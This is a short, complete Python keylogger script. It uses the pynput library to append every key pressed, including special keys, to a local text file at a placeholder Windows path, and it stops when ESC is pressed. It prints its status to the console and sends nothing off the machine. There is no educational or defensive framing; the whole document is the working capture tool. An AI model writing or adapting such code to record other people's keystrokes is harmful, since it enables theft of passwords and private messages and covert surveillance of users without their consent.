
from pynput import keyboard

file_path = r"C:\Users\YourName\Documents\key_log.txt"      # replace with your file path

def on_press(key):
    try:
        with open(file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(file_path, "a") as f:
            f.write(f"[{key.name if hasattr(key, 'name') else key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting key logger..")
        return False

try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Press ESC to stop.")
        listener.join()
except Exception as e:
    print(f"Error occurred:{e}")
